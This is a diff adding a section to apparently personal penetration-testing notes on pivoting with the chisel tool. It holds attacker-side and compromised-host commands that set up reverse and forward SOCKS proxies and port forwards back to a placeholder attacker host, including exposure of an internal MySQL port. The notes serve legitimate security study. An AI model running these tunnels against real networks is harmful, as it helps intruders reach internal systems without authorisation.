@@ -189,3 +189,44 @@ Attacker
 
 ![[Pasted image 20240727174405.png]]
 
+Compromised
+```
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+```
+
+```
+client 10.50.88.33:1337 R:socks &
+```
+
+
+Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on `127.0.0.1:1080`. As such, we will be using port 1080 when sending data through the proxy.
+
+
+## Forward Sock Proxy
+Victim
+```
+./chisel server -p LISTEN_PORT --socks5
+```
+
+Attacker
+```
+./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+```
+
+
+
+<h2>So basically we are doing Reverse Socks / Forward Socks/ Remote Port Forward / Local Port Forward </h2>
+
+```
+
+./chisel server -p 4242 --reverse
+./chisel client 172.16.0.200:4242 R:socks &
+
+./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+./chisel client 172.16.0.200:1337 R:3306:172.16.0.100:3306 &
+
+./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+./chisel client 172.16.0.10:4444 8000:172.16.0.5:80
+```
+
+
